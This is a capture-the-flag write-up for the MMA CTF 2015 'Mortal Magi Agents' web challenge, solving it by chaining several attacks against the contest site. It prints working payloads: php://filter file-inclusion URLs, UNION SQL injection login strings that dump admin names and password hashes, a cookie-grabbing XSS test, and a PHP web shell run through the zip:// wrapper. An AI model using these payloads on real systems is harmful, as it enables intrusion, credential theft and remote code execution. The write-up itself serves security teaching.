
## MMA 1st CTF 2015 - Mortal Magi Agents (Web 300)
##### 05/09 - 07/09/2015 (48hr)
___
### Description: 

http://magiagents.chal.mmactf.link/
___
### Solution

We start by looking at the urls:
```
  http://magiagents.chal.mmactf.link/?page=home
  http://magiagents.chal.mmactf.link/?page=news
```
Probably an LFI. Let's try:
```
  http://magiagents.chal.mmactf.link/?page=settings
```

Page returns the settings page which is available after login. NULL byte is not allowed, here
but LFI is possible as we shouldn't have seen settings page. Let's try php wrappers:
```
http://magiagents.chal.mmactf.link/index.php?page=php://filter/convert.base64-encode/resource=home
```
Bingo! A base64 string is returned with the page:
```
PGRpdiBjbGFzcz0icGFnZS1oZWFkZXIiPjxoMT5Ib21lPC9oMT48L2Rpdj4KCjxpbWcgc3JjPSJtYWdpLmpwZyI+Cgo8P3
BocAppZiAoaXNzZXQoJF9TRVNTSU9OWyJhZG1pbiJdKSAmJiAkX1NFU1NJT05bImFkbWluIl0pIHsKICAgIGVjaG8gZmls
ZV9nZXRfY29udGVudHMoIi4uL2ZsYWciKTsKfQo=
```
We decode it and we get the page source:
```html
  <div class="page-header"><h1>Home</h1></div>

  <img src="magi.jpg">

  <?php
  if (isset($_SESSION["admin"]) && $_SESSION["admin"]) {
      echo file_get_contents("../flag");
  }
```
We can do the same for the rest files (the code for each file is in separete file):
```
http://magiagents.chal.mmactf.link/index.php?page=php://filter/convert.base64-encode/resource=settings
http://magiagents.chal.mmactf.link/index.php?page=php://filter/convert.base64-encode/resource=news
http://magiagents.chal.mmactf.link/index.php?page=php://filter/convert.base64-encode/resource=logout
http://magiagents.chal.mmactf.link/index.php?page=php://filter/convert.base64-encode/resource=index
http://magiagents.chal.mmactf.link/index.php?page=php://filter/convert.base64-encode/resource=login
http://magiagents.chal.mmactf.link/index.php?page=php://filter/convert.base64-encode/resource=logout
http://magiagents.chal.mmactf.link/index.php?page=php://filter/convert.base64-encode/resource=db
```
Now we have all the source. Is it an SQLi? We can't do sqli in signup as it has a strong filter,
but we can do it on signin:
```php
    $user = $_POST['user'];
    $password = $_POST["password"];    
    $db = connect_db();

    $results = $db->query("SELECT * FROM users WHERE (name = '$user' AND not banned)");
```

NOTE: if we open db.php we'll see this line: 
      mysqli_connect('localhost', 'magiagents', '6fc1401279387c561b891c2672b1b418', 'magiagents');
      However  mysql server is not accessible from outside (obviously!).

Let's start our SQLi. First we register a user fooo2:fooo2. Then we login as:
```
http://magiagents.chal.mmactf.link/login.php
  user=' or name='fooo2
  &password=fooo2
  &signin=
```
And we logged in as fooo2. Let's see how many columns exist in users table:
```
  user=fooo2' AND not banned) UNION ALL SELECT 0x61,0x62,0x63
                              UNION ALL (SELECT * FROM users WHERE name='
  &password=fooo2
```
The above query returns a blank page (as we cause an internal MySQL error), but this query:
```
  user=fooo2' AND not banned) UNION ALL SELECT 0x61,0x62,0x63,0x64 
                              UNION ALL (SELECT * FROM users WHERE name='
  &password=fooo2
```

Can login as fooo2. Nice! We know that there are 4 columns. We can identify columns names just
by looking source code: name, hashed_password, avator, banned.

Let's see what's going on the admins table. We assume that there are <=4 columns there.
```
  user=fooo2' AND not banned) UNION ALL SELECT (SELECT * FROM admins LIMIT 1)
                                UNION ALL (SELECT * FROM users WHERE name='
  &password=fooo2
```
This query gives an error, but this query:
```
  user=fooo2' AND not banned) UNION ALL SELECT (SELECT * FROM admins LIMIT 1), 0x62, 0x63, 0x64
                                UNION ALL (SELECT * FROM users WHERE name='
  &password=fooo2
```
Doesn't. Thus there's a single column in admins table. Let's make a guess for the name:
```
  user=fooo2' AND not banned) UNION ALL SELECT (SELECT name FROM admins LIMIT 1), 0x62, 0x63, 0x64
                                UNION ALL (SELECT * FROM users WHERE name='
  &password=fooo2
```

As long as we don't get a blank page back, the only column in admins table is called name.

Then we try to login as admin:admin
```
  user=') UNION ALL SELECT 'admin', 'd033e22ae348aeb5660fc2140aec35850c4da997',0x63,0x64 
          UNION ALL (SELECT * FROM users WHERE name='
  &password=admin
```
We're logged in as admin but we can't get the flag:
```php
        $results = $db->query("SELECT * FROM admins");
        
        while ($row = $results->fetchArray()) {
            if ($row["name"] === $user) {
                $_SESSION["admin"] = true;
                break;
            }
        }
```

The reason is that $user will contain the whole SQLi string and not the username "admin".
However the above example returns an image with filename "c" (0x63). Now we have a path
to extract data from the DB. By replacing the 0x63 in the previous query with a SELECT
statement we get some useful data:
```
(SELECT group_concat(name) FROM admins)   ---> admin, asdf, m
(SELECT group_concat(name,hashed_password) FROM users WHERE name='admin' OR name='asdf' OR name='m')
--->  ffffffffffffffffffffffffffffffffffffffff, 
      5feba136aea0208ee7f522eb2de1b315eb828512,
      6b0d31c0d563223024da45691584643ac78c96e8
```
We can dump all usernames and hashes but this is not the point. From these hashes we can crack
only the last one which is 'm'. Then we login as m:m and we get the flag: 
**  MMA{5ded4df85bb8785f9cff08268703278c4e18e3fd} **

___
I surprised from having a so simple username/password, and I contact the authors. They told me
that some else inserted that value, so this wasn't the correct way to solve it. Then I went back
and I was trying to solve it with the correct way. I looked for an injection in UPDATE, in order
to insert or change a row in admins table. This however wasn't possible as we have to craft an
injection statement that will be valid both in SELECT and in UPDATE. THe problem was the different
syntax and the extra "(" appeared in SELECT. We need a different way.

An XSS is possible but useless:
```
  user=' or /*<script>alert('xss:' + document.cookie)</script>*/ name='fooo2
  &password=fooo2
```

There's one thing that we miss all this time. The image upload. If we could upload a php file
then we could solve the challenge. The image checks are weak, so we can upload a php file. 
However this file won't have the .php extension. Let's go back to our LFI and see if we 
can do something else. From all the available wrappers, zlib is the most interesting.
zlib wrapper allow us to uncompress and execute a php file. This means that file doesn't
have to have the php extension. As zlib is for php 4 only, we'll use zip.

So, we login as fooo2:fooo2 and we upload a zip file, containing a foo.php file:
```
  <?php echo 'EXEC CODE</br>'; system( $_GET['cmd']) ?>
```
Then we upload the zip file which is stored at: avators/fooo22d555a4891d6ebc52e722f991855b25356b68333
zip wrapper usage is (http://php.net/manual/en/wrappers.compression.php): 
  zip://archive.zip#dir/file.txt

So we go back to our LFI and we try to access our file:
```
  http://magiagents.chal.mmactf.link/index.php?page=zip://avators/fooo22d555a4891d6ebc52e722f991855b25356b68333%23foo&cmd=ls
```
Note that the file name is foo and not foo.php because index.php appends the .php extension:
```php
  <?php
    include("$page.php");
  ?>
```
We do an ls and we can access directory files:
  avators css db.php fonts home.php index.php js login.php logout.php magi.jpg news.php settings.php

Finally we get tha flag:
  http://magiagents.chal.mmactf.link/index.php?page=zip://avators/fooo22d555a4891d6ebc52e722f991855b25356b68333%23foo&cmd=cat ../flag

**MMA{5ded4df85bb8785f9cff08268703278c4e18e3fd}**
___